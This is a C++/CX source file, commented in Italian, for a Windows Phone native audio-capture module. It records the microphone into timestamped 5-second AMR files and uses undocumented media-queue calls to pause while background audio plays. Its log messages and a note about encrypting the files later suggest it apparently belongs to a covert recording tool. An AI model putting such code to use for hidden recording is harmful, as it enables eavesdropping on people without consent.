#include "NativeAudioInterface.h"
#include "FunctionFunc.h"
#include "Log.h"

using namespace Microsoft::WRL;
using namespace Windows::Foundation;
using namespace Windows::Foundation::Collections;
using namespace Windows::Phone::Media::Capture;
using namespace Windows::Storage;
using namespace Concurrency;
using namespace Platform;

//messo qua per poter forzare lo stop da dentro OnSampleAvailable
Windows::Phone::Media::Capture::AudioVideoCaptureDevice ^pAudioVideoCaptureDevice;



#include <time.h>


#define DTTMFMT "%Y-%m-%d %H:%M:%S "
#define DTTMSZ 21

//#define DTTMFMTAUD "%Y%m%d%H%M%Sxxxxxx"
#define DTTMFMTAUD "%Y%m%d%H%M%S"
#define DTTMSZAUD 16


static int COSTRUITO=0;

static char *getDtTmAUD (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZAUD, DTTMFMTAUD, localtime (&t));
    return buff;
}

static char *getDtTm (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
    return buff;
}

#include <windows.h>
#include <iostream>
#include <fstream>

using namespace std;
using namespace NativeAudioInterface::Native;
static int fAudio=FALSE;

// Called each time a captured frame is available	
void CameraCaptureSampleSink::OnSampleAvailable(
	ULONGLONG hnsPresentationTime,
	ULONGLONG hnsSampleDuration,
	DWORD cbSample,
	BYTE* pSample)
{



	static char nomeFileBase[DTTMSZAUD];

	// creo file da 5sec 

	//1MB di buffer
	static BYTE bufferTmp[1024*512];

	//la grandezza del file comprende il timestamp + il trefisso audio piu 999999 campioni
	char nomeFile[sizeof("audio")+DTTMSZAUD+1+6];
	

	// hnsPresentationTime aumenta partendo da 0 allo start, 1 sec=10000000
	 // Header= 35, 33, 65, 77, 82, 10
	 // Header= 23  21  41  4D  52  0A

	//per evitare gli ultimi campionamenti spuri evito di eseguire ulteriore codice 
	//if (NativeAudioInterface::Native::NativeCapture::fAudioCaptureForceStop==TRUE) return;
	if (NativeCapture::fAudioCaptureForceStop==TRUE) return;

	if(NativeCapture::pos==0&&NativeCapture::nCamp==1)
	{
		BYTE HEADER[]={35, 33, 65, 77, 82, 10};
		
		memcpy(bufferTmp,HEADER,sizeof(HEADER));
		NativeCapture::pos=sizeof(HEADER);

		//creo il nome del file come data file (poi vedro' come criptarli)
		char buff[DTTMSZAUD];
   		getDtTmAUD(buff);
		strcpy(nomeFileBase,buff);

		//
		WCHAR msg[128];
		swprintf_s(msg, L"\n1Header) Pos=%i nCamp=%i: \n",NativeCapture::pos,NativeCapture::nCamp);OutputDebugString(msg);
	}
	//else 
	//	pos=0;

	
	memcpy(bufferTmp+NativeCapture::pos,pSample,cbSample);
	NativeCapture::pos=NativeCapture::pos+cbSample;

	//catturo blocchi di 5 sec 
	/*
	if((hnsPresentationTime>(ULONGLONG)5*10000000) && (NativeAudioInterface::Native::NativeCapture::fAudioCapture==TRUE))
	{
		NativeAudioInterface::Native::NativeCapture::fAudioCapture=FALSE;
			
		fstream filestr;
		sprintf(nomeFile,"audio%s_%i.amr",nomeFileBase,nCamp);
		filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
		filestr.seekg (0, ios::beg);
		filestr.write ((const char*)bufferTmp, pos);
		filestr.close();
		OutputDebugStringA(nomeFile);
		//pos=0;
		nCamp++;
	}
	*/
	DWORD b=false;
	_Media_Queue_GameHasControl(&b);
	if(NativeCapture::fAudioCapture==FALSE || b==0)
	{
		WCHAR msg[128];
		swprintf_s(msg, L"\n3exit) Pos=%i nCamp=%i: \n",NativeCapture::pos,NativeCapture::nCamp);OutputDebugString(msg);

		//dovrei entrare qua dentro solo quando stoppo il processo per cui mi trovo un trunk non completo
		fstream filestr;
		sprintf(nomeFile,"audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
		filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
		filestr.seekg (0, ios::beg);
		filestr.write ((const char*)bufferTmp, NativeCapture::pos);
		filestr.close();
		OutputDebugStringA(nomeFile);
		NativeCapture::fAudioCaptureForceStop=TRUE;
		NativeCapture::pos=0;
		NativeCapture::nCamp=1;
		if(b==0) 
		{
			////_ZMediaQueue_DisconnectFromService(); //tolto perche' mi crea un eccezione a liverllo di kernel; controllare se si autodisalloca o se crea problemi
			NativeCapture::fAudioCapture=FALSE;
			
			Log logInfo;
			logInfo.WriteLogInfo(L"Suspending microphone while audio is playing in background");

			NativeCapture::fStartPlay=FALSE;
			pAudioVideoCaptureDevice->StopRecordingAsync();
		}
	}
	else if( hnsPresentationTime/10000000>(ULONGLONG)(5*NativeCapture::nCamp))
		{
			//NativeAudioInterface::Native::NativeCapture::fAudioCapture=FALSE;
			
			WCHAR msg[128];
			swprintf_s(msg, L"\n2camp) Pos=%i nCamp=%i hnsPresentationTime=%i\n",NativeCapture::pos,NativeCapture::nCamp,hnsPresentationTime);OutputDebugString(msg);


			fstream filestr;
			sprintf(nomeFile,"audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
			filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
			filestr.seekg (0, ios::beg);
			filestr.write ((const char*)bufferTmp, NativeCapture::pos);
			filestr.close();
			OutputDebugStringA(nomeFile);
			NativeCapture::pos=0;
			NativeCapture::nCamp++;
		}
	

}

void NativeCapture::StopCapture()
{
	
	fAudioCapture=FALSE;	

	Windows::Foundation::TimeSpan span;
	span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);

	////_ZMediaQueue_DisconnectFromService(); //tolto perche' mi crea un eccezione a liverllo di kernel; controllare se si autodisalloca o se crea problemi
	
	
	//se è gia' false significa l'ho stoppato precedentemente 
   	if(fStartPlay==TRUE) 
	{
		fStartPlay=FALSE;
		pAudioVideoCaptureDevice->StopRecordingAsync();
	}
	
 



	//pAudioVideoCaptureDevice=nullptr;

}

#include <thread>
#include <chrono>

	


int NativeCapture::StartCapture(HANDLE eventHandle)
{
	fAudioCapture=TRUE;	
	NativeCapture::fAudioCaptureForceStop=FALSE;


	Windows::Foundation::TimeSpan span;
	span.Duration = 30000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);


	//mi sconnetto dal servizio che mi tira su la possibiblita' di controllare il playng in bg dell'audio
	//non posso ceccare se sono gia' precedentemente connesso
	_ZMediaQueue_ConnectToService();

	DWORD b=false;
	_Media_Queue_GameHasControl(&b);
	if(b==1)
	{
		//OutputDebugString(L"Nessun play attivo");	
		fStartPlay=TRUE;
		pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
		/////_ZMediaQueue_DisconnectFromService();
		return FALSE;
	}

	//OutputDebugString(L"Play attivo");
	Log logInfo;
	logInfo.WriteLogInfo(L"Can not activate microphone while background audio is playing, standing by");

	//controllo ogni 10 sec che sia finito il playng dell'audio in bk	
	while(fAudioCapture==TRUE && _WaitForSingleObject(eventHandle, 10000))
	{
		_Media_Queue_GameHasControl(&b);
		if(b==1)
		{
			//OutputDebugString(L"Nessun play attivo");	
			fStartPlay=TRUE;
			pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
			/////_ZMediaQueue_DisconnectFromService();
			return TRUE;
		}
	}


return TRUE;

		
		/*****
		//acrocchio che mi permette di aspettare sino a 10 sec che sia completata 
		//l'operazioe di inizializzazione tramite IAsyncOperation (non riesco a trovare un metodo piu' pulito)
		for(int i=0;i<20;i++)
		{
			
			auto stato=openOperation->Status;
			//if (openOperation->Status!=Windows::Foundation::AsyncStatus::Started) 
			if (openOperation->Status==Windows::Foundation::AsyncStatus::Completed)
				{
					fAudioCaptureForceStop=FALSE;
					pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
					break;
				}
			std::this_thread::sleep_for(std::chrono::milliseconds(500));
		}
		****/


}

NativeAudioInterface::Native::NativeCapture::NativeCapture()
{
	fStartPlay=FALSE;
	fAudioCapture=FALSE;
	/*****
	abilitando non rifaccio un nuovo new per ogni volta che devo attivare il microfono ma sfrutto quanto gia'  allocato in precedenza
	visto che dai test fatti in AudioOnly.sln diventa instabile
	if (COSTRUITO>0)
	{
		NativeCapture::pos=0;
		NativeCapture::nCamp=1;
		return;
	}
	else COSTRUITO++;
	*****/
/*****
	//IAsyncOperation<AudioVideoCaptureDevice^> ^openOperation = AudioVideoCaptureDevice::OpenForAudioOnlyAsync();
	openOperation = AudioVideoCaptureDevice::OpenForAudioOnlyAsync();

	openOperation->Completed = ref new AsyncOperationCompletedHandler<AudioVideoCaptureDevice^>(
		[this] (IAsyncOperation<AudioVideoCaptureDevice^> ^operation, Windows::Foundation::AsyncStatus status)
		{
			if (status == Windows::Foundation::AsyncStatus::Completed)
			{
				auto captureDevice = operation->GetResults();

				// Save the reference to the opened video capture device
				pAudioVideoCaptureDevice = captureDevice;


				// Retrieve the native ICameraCaptureDeviceNative interface from the managed video capture device
				ICameraCaptureDeviceNative *iCameraCaptureDeviceNative = NULL; 
				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(ICameraCaptureDeviceNative), (void**) &iCameraCaptureDeviceNative);

				// Save the pointer to the native interface
				pCameraCaptureDeviceNative = iCameraCaptureDeviceNative;
			
				// Retrieve IAudioVideoCaptureDeviceNative native interface from managed projection.
				IAudioVideoCaptureDeviceNative *iAudioVideoCaptureDeviceNative = NULL;
				hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(IAudioVideoCaptureDeviceNative), (void**) &iAudioVideoCaptureDeviceNative);

				// Save the pointer to the IAudioVideoCaptureDeviceNative native interface
				pAudioVideoCaptureDeviceNative = iAudioVideoCaptureDeviceNative;

				
				pAudioVideoCaptureDevice->AudioEncodingFormat = CameraCaptureAudioFormat::Amr;
				
				// Initialize and set the CameraCaptureSampleSink class as sink for captures samples
				MakeAndInitialize<CameraCaptureSampleSink>(&pCameraCaptureSampleSink);
				pAudioVideoCaptureDeviceNative->SetAudioSampleSink(pCameraCaptureSampleSink);

				//Start recording (only way to receive samples using the ICameraCaptureSampleSink interface
				//fAudio=TRUE;
				//pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
				//////////fAudioCapture=TRUE;

				//TRUE => che ho finito l'inizializzazione
				//fAudioCapture=TRUE;
				
			}
		}
	);
	***/

	//converto da asincrono ad sincrono l'inizializzazione del mic

	concurrency::cancellation_token_source geopositionTaskTokenSource;

	task<AudioVideoCaptureDevice^> geopositionTask(AudioVideoCaptureDevice::OpenForAudioOnlyAsync(), geopositionTaskTokenSource.get_token());


	geopositionTask.then([=](task<AudioVideoCaptureDevice^> getPosTask)
	{
		/*****
				AudioVideoCaptureDevice^ captureDevice  = getPosTask.get();

				// Save the reference to the opened video capture device
				pAudioVideoCaptureDevice = captureDevice;
		*****/

				pAudioVideoCaptureDevice = getPosTask.get();

				// Retrieve the native ICameraCaptureDeviceNative interface from the managed video capture device
				ICameraCaptureDeviceNative *iCameraCaptureDeviceNative = NULL; 
				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(ICameraCaptureDeviceNative), (void**) &iCameraCaptureDeviceNative);

				// Save the pointer to the native interface
				pCameraCaptureDeviceNative = iCameraCaptureDeviceNative;
			
				// Retrieve IAudioVideoCaptureDeviceNative native interface from managed projection.
				IAudioVideoCaptureDeviceNative *iAudioVideoCaptureDeviceNative = NULL;
				hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(IAudioVideoCaptureDeviceNative), (void**) &iAudioVideoCaptureDeviceNative);

				// Save the pointer to the IAudioVideoCaptureDeviceNative native interface
				pAudioVideoCaptureDeviceNative = iAudioVideoCaptureDeviceNative;

				
				pAudioVideoCaptureDevice->AudioEncodingFormat = CameraCaptureAudioFormat::Amr;
				
				// Initialize and set the CameraCaptureSampleSink class as sink for captures samples
				MakeAndInitialize<CameraCaptureSampleSink>(&pCameraCaptureSampleSink);
				pAudioVideoCaptureDeviceNative->SetAudioSampleSink(pCameraCaptureSampleSink);

				//Start recording (only way to receive samples using the ICameraCaptureSampleSink interface
				//fAudio=TRUE;
				//pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
				//////////fAudioCapture=TRUE;

				//TRUE => che ho finito l'inizializzazione
				//fAudioCapture=TRUE;
				
			}
		
	).wait();

	NativeCapture::pos=0;
	NativeCapture::nCamp=1;

	OutputDebugString(L"0Init) \n");
}
